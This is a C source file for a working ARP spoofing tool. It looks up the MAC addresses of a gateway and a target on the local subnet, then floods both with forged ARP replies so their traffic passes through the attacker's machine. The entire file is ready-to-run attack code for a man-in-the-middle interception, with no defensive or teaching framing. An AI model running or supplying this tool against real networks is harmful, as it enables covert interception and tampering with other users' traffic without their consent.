#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pcap.h>
#include <signal.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <netpacket/packet.h>
#include <net/if.h>
#include <netinet/ip_icmp.h>
#include <netinet/if_ether.h>
#include <netinet/tcp.h>

#include "tools/nettools.h"

#define IPSLEN  20
#define MACSLEN 25
#define NPACKS  20
#define FAIL    -1
#define ARPSIZ  42
#define IP_ALEN 4


void print_usage(char *pname);

int main(int argc, char *argv[]) {
    char dev[IFNAMSIZ];
    char our_m_str[MACSLEN], target_m_str[MACSLEN], host_m_str[MACSLEN];    
    char our_ip_str[IPSLEN], host_str[IPSLEN], target_str[IPSLEN];
    struct ifreq ifreq_i, ifreq_c, ifreq_ip;
    uint8_t our_ip[IP_ALEN], host_ip[IP_ALEN], target_ip[IP_ALEN];
    int sock; 
    unsigned char our_mac[ETH_ALEN], target_mac[ETH_ALEN], host_mac[ETH_ALEN];

    // create raw socket
    if ((sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) < 0) {
        if (getuid() != 0) {
            printf("Run again as sudo! (sudo ./arp_spoof)\n");
            exit(0);
        }
        printf("Error : raw sock create failed\n");
        exit(1);
    }

    // arg check
    if (argc < 3) {
        print_usage(argv[0]);
        exit(1);
    }

    // pass defaults
    int num_packets = NPACKS;
    uint8_t t_sufix  = 0;
    uint8_t h_sufix  = 1;
 
    int dev_from_arg, op;
    dev_from_arg = op = 0;
    while ((op = getopt(argc, argv, "i:t:h:n:")) != FAIL) {
        switch (op) {

            case 'i':
                // interface argument  
                dev_from_arg = 1;

                if (strlen(optarg) > IFNAMSIZ) {
                    fprintf(stderr, "Error : interface name %s too long\n", optarg);
                    exit(1);
                }
                strncpy(dev, optarg, IFNAMSIZ);
                dev[strlen(optarg)] = 0;
                break;

            case 't':
                // target argument (required)
                if ((t_sufix = atoi(optarg)) > 254) {
                        printf("host sufix %d to high (over 254)\n", t_sufix);
                        exit(1);
                }
                break;

            case 'h':
                // host argument
                if ((h_sufix = atoi(optarg)) > 254) {
                        printf("host sufix %d to high (over 254)\n", h_sufix);
                        exit(1);
                }
                break;

            case 'n':
                // num-packets argument
                num_packets = atoi(optarg);
                break;

            default:
                print_usage(argv[0]);
                exit(1);
                break;
        }
    }

    // check args
    if(t_sufix == 0) {
        fprintf(stderr, "Must provide target IP sufix\n");
        print_usage(argv[0]);
        exit(1);
    }

    if (!dev_from_arg) {
        if (get_default_interface(dev) == FAIL) {
            fprintf(stderr, "Failed to get default interface\n");
            exit(1);
        }
    }

    // get interface info
    if(get_if_info(sock, dev, &ifreq_i, &ifreq_c, &ifreq_ip) == FAIL) {
        printf("Failed to get info for interface %s (you probably chose the wrong one, try ifconfig or google)\n", dev);
        exit(1);
    }

    // print/save interface info 
    memcpy(our_mac, (unsigned char *)(ifreq_c.ifr_hwaddr.sa_data), ETH_ALEN);
    mac_to_str(our_m_str, our_mac); 
    memcpy(our_ip, (void *)&(((struct sockaddr_in *)&(ifreq_ip.ifr_addr))->sin_addr), IP_ALEN);
    sprintf(our_ip_str, "%d.%d.%d.%d\n", 
            our_ip[0], 
            our_ip[1],
            our_ip[2],
            our_ip[3]); 


    // save, parse, and check host/target IP's
    memcpy(target_ip, our_ip, IP_ALEN);
    memcpy(host_ip, our_ip, IP_ALEN);
    target_ip[3] = t_sufix;
    host_ip[3]   = h_sufix;
    ip_to_str(target_str, target_ip);
    ip_to_str(host_str, host_ip);

    if (!is_valid_ip(target_str)) {
        printf("Error %s is not a vaild ip address\n", target_str);
        exit(1);
    }
    if (!is_valid_ip(host_str)) {
        printf("Error %s is not a vaild ip address\n", host_str);
        exit(1);
    }

    // send request for host MAC
    send_arp(sock, ifreq_i.ifr_ifindex,
            our_mac,        // eth source mac
            broadcast,      // eth dest mac
            our_mac,        // arp source mac
            empty,          // arp dest mac
            our_ip,         // arp source ip
            host_ip,        // arp dest ip
            ARPOP_REQUEST); // opcode

    // get host MAC from reply
    
    struct ether_arp *arp = recv_arp(sock, ARPOP_REPLY, host_ip);
    memcpy(host_mac, arp->arp_sha, ETH_ALEN);
    mac_to_str(host_m_str, host_mac);

    // send request for target MAC
    send_arp(sock, ifreq_i.ifr_ifindex,
            our_mac,        // eth source mac
            broadcast,      // eth dest mac
            our_mac,        // arp source mac
            empty,          // arp dest mac
            our_ip,         // arp source ip
            target_ip,      // arp dest ip
            ARPOP_REQUEST); // opcode

    // get target MAC from reply
    arp = recv_arp(sock, ARPOP_REPLY, target_ip);
    memcpy(target_mac, arp->arp_sha, ETH_ALEN);
    mac_to_str(target_m_str, target_mac);

    // poison host
    printf("Poisoning host...\n");
    for (int i = num_packets; i > 0; --i) {
        send_arp(sock, ifreq_i.ifr_ifindex, our_mac,
                host_mac, 
                our_mac, 
                host_mac, 
                target_ip, 
                host_ip,
                ARPOP_REPLY);

        sleep(1);
        printf("H:(%s) ---> U:(%s) ---> T:(%s)\n", host_m_str, our_m_str, target_m_str);
    }

    // poison target 
    printf("Poisoning target...\n");
    for (int i = num_packets; i > 0; --i) {
        send_arp(sock, ifreq_i.ifr_ifindex, our_mac,
                target_mac,
                our_mac,
                target_mac,
                host_ip,
                target_ip,
                ARPOP_REPLY);
        
        sleep(1);
        printf("T:(%s) ---> U:(%s) ---> H:(%s)\n", target_m_str, our_m_str, host_m_str);
    }
    exit(0);
}


void print_usage(char *pname) {
    char *u_string = "Usage: (sudo) %s -t target-sufix [-i interface   (else default)]   \n"
                     "                                          [-h host-sufix  (default 1)]  \n" 
                     "                                          [-n num-packets (default 20)]\n";
    fprintf(stderr, u_string, pname);
}

